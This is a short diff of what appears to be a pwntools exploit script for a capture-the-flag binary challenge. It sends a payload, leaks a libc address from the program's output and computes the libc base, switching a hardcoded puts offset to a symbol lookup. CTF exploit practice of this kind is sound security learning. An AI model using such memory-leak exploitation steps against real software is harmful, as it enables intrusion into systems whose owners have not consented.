@@ -35,7 +35,7 @@ ddebug("b *0x401153\ncontinue")
 io.sendlineafter("Hello\nInput your data:\n", payload)
 
 leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
-puts_offset = 0x7f1bb3fcd5a0-0x7f1bb3f4d000
+puts_offset = libc.symbols["puts"]
 libc.address = leak - puts_offset
 log.success("libc:-----> " + hex(libc.address))
 
